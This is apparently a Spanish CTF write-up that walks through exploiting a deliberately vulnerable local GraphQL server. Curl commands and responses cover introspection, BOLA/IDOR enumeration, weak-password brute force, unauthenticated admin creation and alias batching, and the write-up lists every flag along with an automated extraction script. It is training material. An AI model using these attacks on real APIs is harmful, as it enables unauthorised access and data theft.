# CTF GraphQL - Writeup Completo

## Introduccion

Este writeup documenta la explotacion de un servidor GraphQL vulnerable. El CTF contiene **14 flags** que demuestran vulnerabilidades comunes en APIs GraphQL segun OWASP API Security Top 10.

**Endpoint:** `http://localhost:4000/graphql`

---

## Requisitos Previos

```bash
# Levantar el servidor
docker-compose up -d

# Verificar que esta corriendo
curl -s http://localhost:4000/graphql -X POST \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __typename }"}' | jq
```

---

## FLAG 1: Query Hello (Facil)

**Vulnerabilidad:** Punto de entrada basico - Exposicion de informacion

**Descripcion:** La query `hello` es el punto de entrada inicial que revela informacion sobre el CTF.

### Comando curl:

```bash
curl -s http://localhost:4000/graphql -X POST \
  -H "Content-Type: application/json" \
  -d '{"query": "{ hello }"}' | jq
```

### Respuesta esperada:

```json
{
  "data": {
    "hello": "¡Bienvenido al CTF GraphQL! Usa introspección para descubrir el schema. GCRBA{w3lc0m3_70_gr4phql}"
  }
}
```

### Flag obtenida:
```
GCRBA{w3lc0m3_70_gr4phql}
```

---

## FLAG 2: Introspeccion Completa (Facil)

**Vulnerabilidad:** Introspeccion habilitada en produccion (API3:2023 - Excessive Data Exposure)

**Descripcion:** GraphQL permite consultar su propio schema mediante queries de introspeccion. En produccion, esto deberia estar deshabilitado ya que expone toda la estructura de la API.

### Comando curl - Descubrir tipos:

```bash
curl -s http://localhost:4000/graphql -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ __schema { types { name kind description } } }"
  }' | jq
```

### Comando curl - Explorar tipo HiddenData:

```bash
curl -s http://localhost:4000/graphql -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ __type(name: \"HiddenData\") { name fields { name type { name } } } }"
  }' | jq
```

### Comando curl - Introspeccion completa del schema:

```bash
curl -s http://localhost:4000/graphql -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query IntrospectionQuery { __schema { queryType { name fields { name description } } mutationType { name fields { name description args { name type { name } } } } types { name kind fields { name type { name kind } } } } }"
  }' | jq
```

### Flag obtenida:
```
GCRBA{1n7r05p3c710n_m4573r}
```

**Nota:** Esta flag se encuentra en el campo `internalFlag` del tipo `HiddenData`.

---

## FLAG 3: Query Oculta getHiddenData (Facil-Medio)

**Vulnerabilidad:** Query oculta descubrible por introspeccion

**Descripcion:** Mediante la introspeccion descubrimos que existe una query llamada `getHiddenData` que devuelve informacion sensible.

### Comando curl:

```bash
curl -s http://localhost:4000/graphql -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ getHiddenData { adminSecret internalFlag debugInfo apiVersion } }"
  }' | jq
```

### Respuesta esperada:

```json
{
  "data": {
    "getHiddenData": {
      "adminSecret": "GCRBA{h1dd3n_5ch3m4_f0und}",
      "internalFlag": "GCRBA{1n7r05p3c710n_m4573r}",
      "debugInfo": "GCRBA{d3bug_m0d3_3xp053d}",
      "apiVersion": "1.0.0-vulnerable"
    }
  }
}
```

### Flag obtenida:
```
GCRBA{h1dd3n_5ch3m4_f0und}
```

---

## FLAG 4: Acceso al Usuario Admin (Medio)

**Vulnerabilidad:** Broken Object Level Authorization - BOLA (API1:2023)

**Descripcion:** La query `user(id: Int!)` no valida si el usuario actual tiene permisos para ver otros usuarios. Cualquier usuario puede acceder a informacion del admin simplemente conociendo su ID.

### Comando curl - Enumerar usuarios:

```bash
# Probar IDs del 1 al 5
for i in 1 2 3 4 5; do
  echo "=== Usuario ID: $i ==="
  curl -s http://localhost:4000/graphql -X POST \
    -H "Content-Type: application/json" \
    -d "{\"query\": \"{ user(id: $i) { id username email role secret isAdmin } }\"}" | jq
done
```

### Comando curl - Acceder al admin (ID 1):

```bash
curl -s http://localhost:4000/graphql -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ user(id: 1) { id username email role secret isAdmin } }"
  }' | jq
```

### Respuesta esperada:

```json
{
  "data": {
    "user": {
      "id": 1,
      "username": "admin",
      "email": "admin@ctf.local",
      "role": "admin",
      "secret": "GCRBA{4dm1n_4cc355_gr4n73d}",
      "isAdmin": true
    }
  }
}
```

### Flag obtenida:
```
GCRBA{4dm1n_4cc355_gr4n73d}
```

---

## FLAG 5: Post Privado del Admin (Medio)

**Vulnerabilidad:** IDOR - Insecure Direct Object Reference (API1:2023)

**Descripcion:** La query `post(id: Int!)` no valida si el post es publico o privado. Podemos acceder a posts privados directamente por su ID.

### Comando curl - Listar posts publicos:

```bash
curl -s http://localhost:4000/graphql -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ posts { id title published authorId } }"
  }' | jq
```

### Comando curl - Acceder a post privado (ID 2):

```bash
curl -s http://localhost:4000/graphql -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ post(id: 2) { id title content published authorId } }"
  }' | jq
```

### Comando curl - Enumerar posts del 1 al 5:

```bash
for i in 1 2 3 4 5; do
  echo "=== Post ID: $i ==="
  curl -s http://localhost:4000/graphql -X POST \
    -H "Content-Type: application/json" \
    -d "{\"query\": \"{ post(id: $i) { id title content published } }\"}" | jq
done
```

### Respuesta esperada:

```json
{
  "data": {
    "post": {
      "id": 2,
      "title": "Post privado del admin",
      "content": "GCRBA{pr1v473_p057_l34k3d}",
      "published": false,
      "authorId": 1
    }
  }
}
```

### Flag obtenida:
```
GCRBA{pr1v473_p057_l34k3d}
```

---

## FLAG 6: Login Fallido con Debug Info (Medio)

**Vulnerabilidad:** Information Disclosure (API3:2023)

**Descripcion:** El endpoint de login expone informacion de debug incluso en logins fallidos. Esto puede revelar informacion sensible sobre el sistema.

### Comando curl:

```bash
curl -s http://localhost:4000/graphql -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation { login(username: \"admin\", password: \"wrong_password\") { success message token debugInfo } }"
  }' | jq
```

### Respuesta esperada:

```json
{
  "data": {
    "login": {
      "success": false,
      "message": "Login fallido para usuario: admin",
      "token": null,
      "debugInfo": "GCRBA{d3bug_1nf0_l34k3d}"
    }
  }
}
```

### Flag obtenida:
```
GCRBA{d3bug_1nf0_l34k3d}
```

---

## FLAG 7: Login Exitoso como Admin (Medio)

**Vulnerabilidad:** Credenciales debiles (API2:2023 - Broken Authentication)

**Descripcion:** El usuario admin tiene una contrasena debil y predecible: `1234`. Esto se puede descubrir mediante fuerza bruta o adivinanza.

### Comando curl - Fuerza bruta basica:

```bash
# Probar contrasenas comunes
for pass in "admin" "password" "123456" "1234" "admin123"; do
  echo "=== Probando: $pass ==="
  curl -s http://localhost:4000/graphql -X POST \
    -H "Content-Type: application/json" \
    -d "{\"query\": \"mutation { login(username: \\\"admin\\\", password: \\\"$pass\\\") { success message token } }\"}" | jq -r '.data.login.success'
done
```

### Comando curl - Login exitoso:

```bash
curl -s http://localhost:4000/graphql -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation { login(username: \"admin\", password: \"1234\") { success message token user { username role } debugInfo } }"
  }' | jq
```

### Respuesta esperada:

```json
{
  "data": {
    "login": {
      "success": true,
      "message": "Login exitoso",
      "token": "token_1234567890",
      "user": {
        "username": "admin",
        "role": "admin"
      },
      "debugInfo": "Admin login - GCRBA{4dm1n_l0g1n_5ucc355}"
    }
  }
}
```

### Flag obtenida:
```
GCRBA{4dm1n_l0g1n_5ucc355}
```

---

## FLAG 8: Mutation createAdminUser (Dificil)

**Vulnerabilidad:** Broken Function Level Authorization (API5:2023)

**Descripcion:** Existe una mutation oculta `createAdminUser` que permite crear usuarios con rol admin sin requerir autenticacion. Se descubre mediante introspeccion.

### Comando curl - Descubrir mutations:

```bash
curl -s http://localhost:4000/graphql -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ __schema { mutationType { fields { name args { name type { name } } } } } }"
  }' | jq '.data.__schema.mutationType.fields[] | {name, args}'
```

### Comando curl - Crear usuario admin:

```bash
curl -s http://localhost:4000/graphql -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation { createAdminUser(username: \"hacker\", password: \"pwned123\") { id username role secret isAdmin } }"
  }' | jq
```

### Respuesta esperada:

```json
{
  "data": {
    "createAdminUser": {
      "id": 4,
      "username": "hacker",
      "role": "admin",
      "secret": "GCRBA{mu7471on_f0und_cr34t3d_4dm1n}",
      "isAdmin": true
    }
  }
}
```

### Flag obtenida:
```
GCRBA{mu7471on_f0und_cr34t3d_4dm1n}
```

---

## FLAG 9: Inyeccion en updateUserEmail (Dificil)

**Vulnerabilidad:** Improper Input Validation (API8:2023)

**Descripcion:** La mutation `updateUserEmail` no valida correctamente el formato del email, permitiendo modificar el email de cualquier usuario sin autorizacion.

### Comando curl:

```bash
curl -s http://localhost:4000/graphql -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation { updateUserEmail(userId: 2, email: \"admin@pwned.com\") { id username email secret } }"
  }' | jq
```

### Comando curl alternativo con payload de inyeccion:

```bash
curl -s http://localhost:4000/graphql -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation { updateUserEmail(userId: 2, email: \"root@localhost\") { id username email secret } }"
  }' | jq
```

### Respuesta esperada:

```json
{
  "data": {
    "updateUserEmail": {
      "id": 2,
      "username": "user",
      "email": "admin@pwned.com",
      "secret": "GCRBA{1nj3c710n_p4yl04d_w0rk3d}"
    }
  }
}
```

### Flag obtenida:
```
GCRBA{1nj3c710n_p4yl04d_w0rk3d}
```

---

## FLAG 10: Batching Attack (Dificil)

**Vulnerabilidad:** Lack of Resources & Rate Limiting (API4:2023)

**Descripcion:** GraphQL permite enviar multiples queries en una sola request usando aliases. Esto puede usarse para hacer fuerza bruta sin disparar rate limiting tradicional.

### Comando curl - Batching con aliases:

```bash
curl -s http://localhost:4000/graphql -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ t1: validateToken(token: \"token_0001\") { token valid flag } t2: validateToken(token: \"token_0002\") { token valid flag } t3: validateToken(token: \"token_1337\") { token valid flag } t4: validateToken(token: \"token_9999\") { token valid flag } }"
  }' | jq
```

### Script de fuerza bruta con batching:

```bash
# Generar query con multiples tokens
tokens=""
for i in $(seq 1330 1340); do
  tokens="$tokens t$i: validateToken(token: \"token_$i\") { token valid flag }"
done

curl -s http://localhost:4000/graphql -X POST \
  -H "Content-Type: application/json" \
  -d "{\"query\": \"{ $tokens }\"}" | jq '.data | to_entries[] | select(.value.valid == true)'
```

### Comando curl directo con el token correcto:

```bash
curl -s http://localhost:4000/graphql -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ validateToken(token: \"token_1337\") { token valid flag } }"
  }' | jq
```

### Respuesta esperada:

```json
{
  "data": {
    "t3": {
      "token": "token_1337",
      "valid": true,
      "flag": "GCRBA{b47ch_4774ck_5ucc355}"
    }
  }
}
```

### Flag obtenida:
```
GCRBA{b47ch_4774ck_5ucc355}
```

---

## FLAG 11: Error Messages con Stack Trace (Dificil)

**Vulnerabilidad:** Security Misconfiguration - Stack Traces Exposed (API7:2023)

**Descripcion:** Los errores del servidor incluyen stack traces e informacion sensible en las extensiones del error. Esto ayuda a los atacantes a entender la estructura interna.

### Comando curl - Provocar error con ID inexistente:

```bash
curl -s http://localhost:4000/graphql -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ user(id: 999) { username } }"
  }' | jq
```

### Comando curl - Provocar error con tipo invalido:

```bash
curl -s http://localhost:4000/graphql -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ user(id: \"invalid\") { username } }"
  }' | jq
```

### Respuesta esperada:

```json
{
  "errors": [
    {
      "message": "Usuario no encontrado",
      "extensions": {
        "stacktrace": "Error: Usuario no encontrado\n    at Query.user (/app/resolvers.js:XX:XX)...",
        "hint": "GCRBA{3rr0r_m3554g35_3xp053d}"
      }
    }
  ]
}
```

### Flag obtenida:
```
GCRBA{3rr0r_m3554g35_3xp053d}
```

---

## FLAG 12: Rate Limiting Triggered (Bonus)

**Vulnerabilidad/Proteccion:** Rate limiting activo

**Descripcion:** El servidor implementa rate limiting de 100 requests por minuto por IP. Esta flag demuestra que las protecciones estan activas.

### Comando curl - Disparar rate limiting:

```bash
# Enviar 101+ requests rapidamente
for i in $(seq 1 105); do
  curl -s http://localhost:4000/graphql -X POST \
    -H "Content-Type: application/json" \
    -d '{"query": "{ hello }"}' &
done
wait

# La ultima respuesta deberia mostrar el rate limit
curl -s http://localhost:4000/graphql -X POST \
  -H "Content-Type: application/json" \
  -d '{"query": "{ hello }"}' | jq
```

### Script alternativo con contador:

```bash
#!/bin/bash
for i in $(seq 1 110); do
  response=$(curl -s http://localhost:4000/graphql -X POST \
    -H "Content-Type: application/json" \
    -d '{"query": "{ hello }"}')

  if echo "$response" | grep -q "rate"; then
    echo "Rate limit alcanzado en request $i"
    echo "$response" | jq
    break
  fi
done
```

### Respuesta esperada:

```json
{
  "error": "Too many requests",
  "message": "Has excedido el límite de solicitudes. Espera un momento.",
  "hint": "GCRBA{r473_l1m17_tr1gg3r3d}",
  "retryAfter": "60 seconds"
}
```

### Flag obtenida:
```
GCRBA{r473_l1m17_tr1gg3r3d}
```

---

## FLAG 13: Depth Limiting Detected (Bonus)

**Vulnerabilidad/Proteccion:** Depth limiting activo (max 5 niveles)

**Descripcion:** El servidor limita la profundidad de las queries para prevenir ataques DoS mediante queries profundamente anidadas.

### Comando curl - Query con profundidad excesiva:

```bash
curl -s http://localhost:4000/graphql -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ posts { author { posts { author { posts { author { username } } } } } } }"
  }' | jq
```

### Respuesta esperada:

```json
{
  "errors": [
    {
      "message": "'posts' exceeds maximum depth of 5",
      "extensions": {
        "blocked": true,
        "reason": "depth_limit_exceeded",
        "maxDepth": 5,
        "hint": "GCRBA{d3p7h_l1m17_d373c73d}"
      }
    }
  ]
}
```

### Flag obtenida:
```
GCRBA{d3p7h_l1m17_d373c73d}
```

---

## FLAG 14: Alias Attack Detected (Bonus)

**Vulnerabilidad/Proteccion:** Alias limiting activo (max 20 aliases)

**Descripcion:** El servidor limita la cantidad de aliases por query para prevenir ataques de amplificacion.

### Comando curl - Query con 21+ aliases:

```bash
curl -s http://localhost:4000/graphql -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ a1:hello a2:hello a3:hello a4:hello a5:hello a6:hello a7:hello a8:hello a9:hello a10:hello a11:hello a12:hello a13:hello a14:hello a15:hello a16:hello a17:hello a18:hello a19:hello a20:hello a21:hello }"
  }' | jq
```

### Script para generar query con muchos aliases:

```bash
# Generar query con 25 aliases
aliases=""
for i in $(seq 1 25); do
  aliases="$aliases a$i:hello"
done

curl -s http://localhost:4000/graphql -X POST \
  -H "Content-Type: application/json" \
  -d "{\"query\": \"{$aliases}\"}" | jq
```

### Respuesta esperada:

```json
{
  "error": "Alias limit exceeded",
  "message": "Demasiados aliases en la query",
  "aliasCount": 21,
  "maxAllowed": 20,
  "hint": "GCRBA{4l145_4774ck_d373c73d}"
}
```

### Flag obtenida:
```
GCRBA{4l145_4774ck_d373c73d}
```

---

## Resumen de Flags

| # | Flag | Vulnerabilidad | Dificultad |
|---|------|----------------|------------|
| 1 | `GCRBA{w3lc0m3_70_gr4phql}` | Query hello | Facil |
| 2 | `GCRBA{1n7r05p3c710n_m4573r}` | Introspeccion habilitada | Facil |
| 3 | `GCRBA{h1dd3n_5ch3m4_f0und}` | Query oculta | Facil-Medio |
| 4 | `GCRBA{4dm1n_4cc355_gr4n73d}` | BOLA - Acceso a admin | Medio |
| 5 | `GCRBA{pr1v473_p057_l34k3d}` | IDOR - Post privado | Medio |
| 6 | `GCRBA{d3bug_1nf0_l34k3d}` | Information Disclosure | Medio |
| 7 | `GCRBA{4dm1n_l0g1n_5ucc355}` | Credenciales debiles | Medio |
| 8 | `GCRBA{mu7471on_f0und_cr34t3d_4dm1n}` | Mutation oculta | Dificil |
| 9 | `GCRBA{1nj3c710n_p4yl04d_w0rk3d}` | Input Validation | Dificil |
| 10 | `GCRBA{b47ch_4774ck_5ucc355}` | Batching Attack | Dificil |
| 11 | `GCRBA{3rr0r_m3554g35_3xp053d}` | Stack Traces | Dificil |
| 12 | `GCRBA{r473_l1m17_tr1gg3r3d}` | Rate Limiting (Bonus) | Bonus |
| 13 | `GCRBA{d3p7h_l1m17_d373c73d}` | Depth Limiting (Bonus) | Bonus |
| 14 | `GCRBA{4l145_4774ck_d373c73d}` | Alias Limiting (Bonus) | Bonus |

---

## Script Automatizado - Obtener Todas las Flags

```bash
#!/bin/bash

URL="http://localhost:4000/graphql"
echo "=== CTF GraphQL - Extraccion de Flags ==="
echo ""

# FLAG 1
echo "[FLAG 1] Query hello"
curl -s $URL -X POST -H "Content-Type: application/json" \
  -d '{"query": "{ hello }"}' | grep -oP 'GCRBA\{[^}]+\}'

# FLAG 2 y 3
echo "[FLAG 2-3] getHiddenData"
curl -s $URL -X POST -H "Content-Type: application/json" \
  -d '{"query": "{ getHiddenData { adminSecret internalFlag } }"}' | grep -oP 'GCRBA\{[^}]+\}'

# FLAG 4
echo "[FLAG 4] User admin"
curl -s $URL -X POST -H "Content-Type: application/json" \
  -d '{"query": "{ user(id: 1) { secret } }"}' | grep -oP 'GCRBA\{[^}]+\}'

# FLAG 5
echo "[FLAG 5] Post privado"
curl -s $URL -X POST -H "Content-Type: application/json" \
  -d '{"query": "{ post(id: 2) { content } }"}' | grep -oP 'GCRBA\{[^}]+\}'

# FLAG 6
echo "[FLAG 6] Login fallido debug"
curl -s $URL -X POST -H "Content-Type: application/json" \
  -d '{"query": "mutation { login(username: \"admin\", password: \"wrong\") { debugInfo } }"}' | grep -oP 'GCRBA\{[^}]+\}'

# FLAG 7
echo "[FLAG 7] Login admin exitoso"
curl -s $URL -X POST -H "Content-Type: application/json" \
  -d '{"query": "mutation { login(username: \"admin\", password: \"1234\") { debugInfo } }"}' | grep -oP 'GCRBA\{[^}]+\}'

# FLAG 8
echo "[FLAG 8] createAdminUser"
curl -s $URL -X POST -H "Content-Type: application/json" \
  -d '{"query": "mutation { createAdminUser(username: \"pwned\", password: \"test\") { secret } }"}' | grep -oP 'GCRBA\{[^}]+\}'

# FLAG 9
echo "[FLAG 9] updateUserEmail"
curl -s $URL -X POST -H "Content-Type: application/json" \
  -d '{"query": "mutation { updateUserEmail(userId: 2, email: \"hack@ed.com\") { secret } }"}' | grep -oP 'GCRBA\{[^}]+\}'

# FLAG 10
echo "[FLAG 10] Batching attack"
curl -s $URL -X POST -H "Content-Type: application/json" \
  -d '{"query": "{ validateToken(token: \"token_1337\") { flag } }"}' | grep -oP 'GCRBA\{[^}]+\}'

# FLAG 11
echo "[FLAG 11] Error messages"
curl -s $URL -X POST -H "Content-Type: application/json" \
  -d '{"query": "{ user(id: 999) { username } }"}' | grep -oP 'GCRBA\{[^}]+\}'

echo ""
echo "=== Flags Bonus requieren ataques especificos ==="
echo "[FLAG 12] Rate limiting - Enviar 100+ requests"
echo "[FLAG 13] Depth limiting - Query con >5 niveles"
echo "[FLAG 14] Alias limiting - Query con >20 aliases"
```

---

## Herramientas Recomendadas

- **curl** - Para requests HTTP
- **jq** - Para parsear JSON
- **GraphQL Playground** - IDE visual para GraphQL
- **Burp Suite** - Interceptar y modificar requests
- **InQL** - Extension de Burp para GraphQL

---

## Referencias

- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [GraphQL Security Best Practices](https://graphql.org/learn/security/)
- [HackTricks - GraphQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql)
